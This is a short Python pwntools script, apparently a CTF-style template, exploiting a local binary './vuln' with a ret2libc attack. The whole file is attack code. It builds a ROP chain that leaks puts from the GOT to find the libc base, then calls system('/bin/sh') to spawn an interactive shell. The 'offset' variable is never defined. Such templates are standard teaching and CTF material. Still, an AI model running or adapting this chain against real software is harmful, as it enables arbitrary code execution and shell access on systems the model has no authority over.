#!/usr/bin/env python3
from pwn import *

context.update(arch='amd64', os='linux', log_level='debug')

def exploit():
    elf = ELF('./vuln')
    libc = ELF('./libc.so.6')  # If provided
    
    p = process('./vuln')
    
    # Find gadgets
    rop = ROP(elf)
    
    # Common ROP gadgets
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    pop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]
    
    # Leak libc address
    rop.call('puts', [elf.got['puts']])
    rop.call('main')
    
    # Send ROP chain
    payload = b'A' * offset + rop.chain()
    p.sendline(payload)
    
    # Calculate libc base
    leak = u64(p.recv(6).ljust(8, b'\x00'))
    libc.address = leak - libc.sym['puts']
    log.success(f'Libc base: {hex(libc.address)}')
    
    # Get shell
    rop2 = ROP(libc)
    rop2.call('system', [next(libc.search(b'/bin/sh\x00'))])
    
    payload2 = b'A' * offset + rop2.chain()
    p.sendline(payload2)
    
    p.interactive()

if __name__ == '__main__':
    exploit()